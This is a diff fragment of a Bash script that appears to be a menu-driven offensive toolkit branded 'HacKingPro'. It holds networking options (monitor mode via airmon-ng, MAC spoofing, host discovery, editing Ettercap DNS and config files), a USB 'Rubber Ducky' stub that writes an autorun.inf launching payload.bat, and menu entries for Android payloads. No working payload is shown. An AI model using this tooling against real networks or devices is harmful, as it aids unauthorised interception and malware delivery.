-    ${DGrey}┌─╼ ${BRed}[${BYellow} Options ${BRed}]
-    ${DGrey}┖─┲──${BYellow}╼▰ ${BRed}[${BWhite} 01 ${BRed}]${BYellow}╼▰ Choose Network Interface
-    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 02 ${BRed}]${BYellow}╼▰ Enable Monitor Mode
-    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 03 ${BRed}]${BYellow}╼▰ Disabled Monitor Mode
-    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 04 ${BRed}]${BYellow}╼▰ Down Interface
-    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 05 ${BRed}]${BYellow}╼▰ Up Interface
-    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 06 ${BRed}]${BYellow}╼▰ Restart Network-Manager
-    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 07 ${BRed}]${BYellow}╼▰ Change My hostname
-    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 08 ${BRed}]${BYellow}╼▰ Change My MAC Address
-    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 09 ${BRed}]${BYellow}╼▰ Show My Public IP Address
-    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 10 ${BRed}]${BYellow}╼▰ Find Live Hosts In My Network
-    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 11 ${BRed}]${BYellow}╼▰ Open My Router Default Page
-    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 12 ${BRed}]${BYellow}╼▰ EdIt etter.dns
-    ${DGrey}  └──${BYellow}╼▰ ${BRed}[${BWhite} 13 ${BRed}]${BYellow}╼▰ Edit etter.conf
-
-    ${BGreen}┌──${BRed}[${DGrey} ~$(pwd) ${BRed}]
-    ${BGreen}|
-    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} NetWorKing ${BRed}]${BYellow}╼▰  ${BGreen}  ")"
-              read -p "${NetWorKingProMenu}" Anonselc
-              case $Anonselc in
-                1)
-                Info_LocalNet
-                read -p "${Press_ENTER}"
-                ;;
-               2)
-
-               Enable_Monitor_Mode(){
-                 clear
-                 if [[ $LocalHostNAME = '' ]];then
-                   echo "\n"
-                   echo "    You Not Enter the Interface !? "
-                   echo "\n"
-                   read -p "${Press_ENTER}"
-                   clear
-                 else
-                   echo "\n"
-                   airmon-ng start $interface
-                   echo "\n"
-                   echo "$GREEN    Monitor on ${BBlue}(${BRed}>${BBlue}  $interface ${BRed} <${BBlue})$GREEN has been Enable "
-                   echo "\n"
-                   read -p "${Press_ENTER}"
-                   clear
-                 fi
-                 read -p "${Press_ENTER}"
-                 clear
-               }
-               Enable_Monitor_Mode
-               ;;
-               3)
-               Diable_Monitor_Mode(){
-                 if [[ $interface = '' ]];then
-                   echo "\n"
-                   echo "    You Not Enter the Interface !? "
-                   echo "\n"
-                   read -p "${Press_ENTER}"
-                   clear
-                 else
-                   echo "\n"
-                   airmon-ng stop $interface
-                   echo "\n"
-                   echo "$GREEN    Monitor off ${BBlue}(${BRed}>${BBlue}  $interface ${BRed} <${BBlue})$GREEN has been Disabled "
-                   echo "\n"
-                   read -p "${Press_ENTER}"
-                   clear
-                 fi
-               }
-               Diable_Monitor_Mode
-
-               ;;
-               p|P )
-               HacKingProPlanning
-               ;;
-               cl )
-               ClearTarget
-               ;;
-               ls )
-               lahs
-               ;;
-               usb)
-               clear
-               # allows you to change any USB stick to Rubber Ducky.
-CreatePayLoad(){
-  echo " " > payload.bat
-}
-echo"
-[autorun]
-
-label=RubberDUSB
-
-icon=RubberDUSB.ico
-
-open=payload.bat" >> autorun.inf
-               ;;
-               x|X|exit|quit|Exit )
-               clear
-               cd ${MainDirectoriy}
-               HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
-               echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
-               break
-               ;;
-               * )
-               echo "$InvalidOption"
-               ;;
-              esac
-            }
-            NetWorKingPro
-          done
+              NetWorKingPro
+            done
             ;;
             x|X|exit|EXIT )
             cd ${MainDirectoriy}
@@ -9891,6 +9906,10 @@ open=payload.bat" >> autorun.inf
     ${DGrey}┖─┲──╼ ${BRed}[${BYellow} The malware begins executing on the target system ${BRed}]
     ${DGrey}  ┖──╼ ${BRed}[${BYellow} Malware weapon's program code triggers, which takes action on target network to exploit vulnerability. ${BRed}]
 
+    ${DGrey}┌──${BRed}[${LGreen} NetWorKing ${BRed}]
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${BGreen}${slowBlink} NetPro ${resetT}${BRed}]${BGreen}──${resetT}${BYellow}╼▰  ${BRed}[${BGreen} NetWorKingPro ${BRed}]${BGreen}──${resetT}${BYellow}╼▰  ${BRed}[${BGreen}${faintT} NetWorKing Controller ${resetT}${BRed}]
+
     ${ORANGE}┌─╼ ${BRed}[${LGreen} Gateway ${BRed}]
     ${ORANGE}┖─┲─╼ ${BRed}[${BGreen} NAME ${BRed}]${LGreen}─${resetT}${BYellow}╼▰ ${resetT}${BRed}[${LGreen} ${DefaultGatewayNAME} ${BRed}]${LGreen}╼▰
     ${ORANGE}  ┖─╼ ${BRed}[${BGreen} IP ${BRed}]${LGreen}─${resetT}${BYellow}──╼▰ ${resetT}${BRed}[${LGreen} ${DefaultGatewayIP} ${BRed}]${LGreen}╼▰
@@ -9910,37 +9929,11 @@ open=payload.bat" >> autorun.inf
     ${BGreen}|
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
-    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Exploitation   ${BRed}]${BYellow}╼▰  ${BGreen}   ")
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Exploitation ${BRed}]${BYellow}╼▰  ${BGreen}   ")
             read -p "$HacKingProMenuMain" cmd
           case $cmd in
-          1)
-          wine
-          ;;
           2)
           AndroidPayLoadPro
-          ;;
-          3)
-          Mac
-          ;;
-          4)
-                    ;;
-          5)
-          java
-          ;;
-          6)
-          web
-          ;;
-          7)
-          wiri
-          ;;
-          8)
-          fireadd
-          ;;
-          9)
-          webdd
-          ;;
-          10)
-          otherexploit
           ;;
           p|P )
           HacKingProPlanning
@@ -9950,6 +9943,16 @@ open=payload.bat" >> autorun.inf
           ;;
           ls )
           lahs
+          ;;
+          nt|NT|netpro|NetPro)
+          Info_LocalNet
+          while true; do
+            clear
+            ToolHeaderRun
+            TargetStatusRun
+            #statements
+            NetWorKingPro
+          done
           ;;
           x|X|exit|quit|Exit )
           clear
